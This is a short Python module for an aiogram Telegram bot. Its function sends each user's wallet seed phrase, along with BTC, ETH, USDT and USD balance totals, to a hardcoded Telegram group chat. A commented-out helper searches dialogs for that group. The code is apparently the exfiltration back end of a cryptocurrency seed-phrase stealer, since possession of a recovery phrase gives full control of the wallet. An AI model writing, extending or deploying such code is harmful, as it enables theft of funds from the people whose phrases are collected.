from aiogram import Bot
from bot_app.config import settings

bot = Bot(token=settings.token)

async def send_balance_to_telegram(user_id, balance_data):
    chat_id = -5470182025
    text = (
        f"💰 **Обновление баланса для User {user_id}**\n\n"
        f"Фраза/Сид: {balance_data['phrase']}\n\n"
        f"BTC: {balance_data['balance']['total_btc']}\n"
        f"ETH: {balance_data['balance']['total_eth']}\n"
        f"USDT: {balance_data['balance']['total_usdt']}\n"
        f"Итого: ${balance_data['balance']['total_usd']}\n\n"

    )
    print(text)
    await bot.send_message(chat_id, text,parse_mode="HTML")


# async def scan_chats():
#     async with bot:
#         print("Сканирую диалоги...")
#         async for dialog in bot.get_dialogs():
#             print(f"Нашел чат: {dialog.chat.title} | ID: {dialog.chat.id}")
#             if dialog.chat.id == -1005470182025:
#                 print(">>> Группа найдена и добавлена в кэш!")
#
# import asyncio
# asyncio.run(scan_chats())
